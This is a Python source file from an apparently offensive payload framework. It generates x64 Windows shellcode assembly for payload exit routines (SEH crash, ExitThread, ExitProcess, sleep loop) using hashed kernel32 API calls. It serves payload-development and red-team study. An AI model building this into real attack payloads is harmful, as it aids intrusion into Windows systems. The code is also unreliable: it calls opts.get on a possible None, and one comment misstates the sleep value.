"""
Terasploit Framework (c) 2026

Author:          4steroth
License:         BSD-3-Clause
Path:            teralibs/tsf/core/payload/windows/x64/exitfunk_x64.py
"""

from teralibs.tsf.core.payload.windows.x64.block_api_x64 import BlockApiX64


class ExitfunkX64(BlockApiX64):
    """
    Implements arbitrary exit routines for Windows payloads.
    """

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def asm_exitfunk(self, opts: dict | None = None) -> str:
        """
        Generates assembly to trigger an unhandled exception for termination.
        """

        asm = """
            exitfunk:
                pop rax                             ; won't be returning, realign the stack with a pop
        """
        case = opts.get("exitfunk")
        if case == "seh":
            asm += f"""
                push 0
                pop rcx                             ; set the exit function parameter
                mov ebx, {self.block_api_hash("kernel32.dll", "SetUnhandledExceptionFilter")}
                mov r10d, ebx                       ; place the correct EXITFUNK into r10d
                call rbp                            ; SetUnhandledExceptionFilter(0)
                push 0
                ret                                 ; Return to NULL (crash)
            """

        if case == "thread":
            asm += f"""
                push 0
                pop rcx                             ; set the exit function parameter
                mov ebx, {self.block_api_hash("kernel32.dll", "ExitThread")}
                mov r10d, ebx                       ; place the correct EXITFUNK into r10d
                call rbp                            ; call EXITFUNK( 0 );
            """

        if case in ("process", None):
            asm += f"""
                push 0
                pop rcx                             ; set the exit function parameter
                mov r10d, {self.block_api_hash("kernel32.dll", "ExitProcess")}
                call rbp                            ; ExitProcess(0)
            """

        if case == "sleep":
            asm += f"""
                push 300000                         ; 300 seconds
                pop rcx                             ; set the sleep function parameter
                mov r10d, {self.block_api_hash("kernel32.dll", "Sleep")}
                call rbp                            ; Sleep(30000)
                jmp exitfunk                        ; repeat
            """

        return asm
